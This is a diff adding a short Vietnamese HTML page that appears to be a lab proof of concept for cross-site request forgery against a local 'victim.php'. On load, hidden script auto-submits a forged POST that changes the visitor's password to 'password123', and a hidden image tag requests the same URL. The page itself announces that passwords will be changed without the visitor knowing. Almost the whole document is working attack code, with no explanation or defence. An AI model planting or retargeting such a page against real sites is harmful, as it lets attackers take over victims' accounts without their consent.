@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Trang Độc Hại</title>
+</head>
+<body>
+    <h1>Đây là một trang vô hại (hoặc không?)</h1>
+    <p>Khi bạn mở trang này, mật khẩu của bạn sẽ bị thay đổi mà bạn không biết.</p>
+    <img src="http://localhost:8089/CSRF/victim.php" style="display:none;" alt="">
+    <script>
+        // Gửi yêu cầu POST giả mạo
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'http://localhost:8089/CSRF/victim.php';
+        
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'new_password';
+        input.value = 'password123'; // Mật khẩu giả mạo
+
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+    </script>
+</body>
+</html>
